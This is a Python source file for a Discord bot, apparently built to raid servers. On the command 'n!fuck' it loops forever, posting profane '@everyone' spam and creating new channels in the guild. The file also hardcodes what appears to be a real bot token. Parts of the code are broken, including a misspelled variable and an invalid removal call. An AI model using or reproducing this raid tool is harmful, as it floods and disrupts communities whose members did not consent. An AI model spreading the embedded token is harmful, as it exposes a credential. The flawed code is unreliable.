import discord
 
class Bot(discord.Client):
 
    def __init__(self):
        super().__init__()
 
 
    async def on_ready(self):
            print("Logged in as")
            print(self.user.name)
            print(self.user.id)
            print("------")
            print("created by ypzo#9999")
            members = 0
            for guild in self.guilds:
                members += guild.member_count
            await self.change_presence(activity=discord.Activity(type=discord.ActivityType.watching,name=f'{len(self.guilds)} servers and {members} members.'))
 
    async def on_message(self, message):
 
        if (message.author == self.user):
            return
 
        if (message.content.startswith("n!fuck")):
            run = True
            while run is True:
                await message.channel.send('FUCKED BY THE MASSY BOT! @everyone ')
                await message.guild.create_text_channel('FUCKED BY THE MASSY BOT')
                await messagge.channel.remove
            
 
if __name__ == "__main__":
    bot = Bot()
    bot.run("ODQzODI5NDkxOTA5OTE4NzMw.YKJjdA.Z8PUQeIRdv_qlTv4AJl3YH1z2gA")
